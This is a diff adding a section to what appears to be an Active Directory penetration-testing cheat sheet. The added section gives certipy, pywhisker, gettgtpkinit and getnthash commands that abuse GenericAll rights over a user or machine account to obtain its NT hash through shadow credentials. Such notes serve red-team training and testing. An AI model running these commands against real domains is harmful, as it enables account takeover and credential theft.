@@ -204,6 +204,25 @@ Get-NetForestTrust
 
 ## **ACLs**
 
+
+### GenericAll on user "alfred" from "jenaye" (Bloodhound)
+
+its possible to use certipy like this `certipy shadow auto -username jenaye@<domain.local> -p 'AAAAA' -account alfred` to get hash of user alfred, but, you also can do it manualy : 
+
+`proxychains python3 pywhisker.py -d <domain.local> -u jenaye -p 'AAAAA' --target alfred --action "add" --dc-ip <dc-ip> --filename alfred.pfx`
+
+then 
+
+`proxychains python3 gettgtpkinit.py -cert-pfx "alfred.pfx" -pfx-pass "<pass>" "<domain.local>/alfred" "alfred.ccache"`
+
+and get nt hash of alfred : 
+
+`KRB5CCNAME=alfred.ccache proxychains python3 getnthash.py <domain.local>/alfred -key <key>
+`
+
+> Its also possible to do this on machine acccount ( --target 'ComputerXXX$')
+
+
 ### ACLPwn
 
 - [aclpwn.py](https://github.com/fox-it/aclpwn.py)
